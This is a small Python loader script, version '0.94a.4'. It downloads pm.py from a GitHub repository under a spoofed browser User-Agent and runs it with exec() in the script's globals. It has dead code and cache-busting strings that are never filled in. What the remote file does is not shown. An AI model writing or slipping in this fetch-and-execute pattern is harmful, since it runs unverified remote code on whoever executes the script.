import urllib.request
import json
import base64
import uuid
import socket

_orig_getaddrinfo = socket.getaddrinfo

class Runtime:
  @classmethod
  def run(cls,code):
    exec(code,globals())

  @classmethod
  def get(cls,url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req) as response:
        charset = response.info().get_content_charset() or 'utf-8'
        return response.read().decode(charset)

class GitHub:
  api_access = "Unknown"

  @classmethod
  def speedup(cls):
    return
    def getaddrinfo_v4(*args, **kwargs):
        args = list(args)
        if len(args) >= 3:
            args[2] = socket.AF_INET
        return _orig_getaddrinfo(*args, **kwargs)
    socket.getaddrinfo = getaddrinfo_v4

  @classmethod
  def getFileFromAPI(cls,path):
    path = path.split("|")
    url = f"https://api.github.com/repos/{path[0]}/{path[1]}/contents/{path[2]}?ref=main&cb=uuid.uuid4().hex"
    req = urllib.request.Request(url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            content_b64 = data['content']
            cls.api_access = "Allowed"
            return base64.b64decode(content_b64).decode('utf-8')
    except Exception as e:
        cls.api_access = "Restricted"
        raise e

  @classmethod
  def getFileFromRAW(cls,path):
    path = path.split("|")
    return Runtime.get(f"https://raw.githubusercontent.com/{path[0]}/{path[1]}/refs/heads/main/{path[2]}?nocache=uuid.uuid4().hex")
    
  @classmethod
  def getFile(cls,path):
    print(f"Fetching: {path}")
    cls.speedup()
    try:
      return cls.getFileFromAPI(path)
    except Exception as e:
      return cls.getFileFromRAW(path)

print("ver 0.94a.4")
Runtime.run(GitHub.getFile("db0bc|pm|pm.py"))
